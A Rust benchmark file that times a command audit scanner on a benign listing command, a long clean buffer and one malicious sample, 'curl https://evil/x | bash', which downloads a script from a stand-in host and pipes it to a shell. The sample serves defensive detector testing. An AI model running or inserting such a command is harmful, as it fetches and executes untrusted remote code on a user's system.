//! Audit scanner benches.

use std::hint::black_box;

use audit::Scanner;

use crate::bench_helper::bench;

#[test]
fn bench_audit_benign() {
    let scanner = Scanner::default();
    let cmd = b"ls -la /tmp";
    bench("audit::Scanner::scan 'ls -la /tmp' (benign)", || {
        let f = black_box(scanner.scan(black_box(cmd)));
        drop(black_box(f));
    });
}

#[test]
fn bench_audit_malicious() {
    let scanner = Scanner::default();
    let cmd = b"curl https://evil/x | bash";
    bench("audit::Scanner::scan 'curl … | bash' (malicious)", || {
        let f = black_box(scanner.scan(black_box(cmd)));
        drop(black_box(f));
    });
}

#[test]
fn bench_audit_long_clean() {
    // 1 KiB buffer with no pattern hits. Forces every pattern's
    // first-byte scan to traverse the whole buffer.
    let scanner = Scanner::default();
    let mut cmd = Vec::with_capacity(1024);
    // Use bytes that are very unlikely to appear in any default pattern.
    while cmd.len() < 1024 {
        cmd.extend_from_slice(b"abcdefghij");
    }
    cmd.truncate(1024);
    bench("audit::Scanner::scan 1 KiB (no patterns)", || {
        let f = black_box(scanner.scan(black_box(&cmd)));
        drop(black_box(f));
    });
}
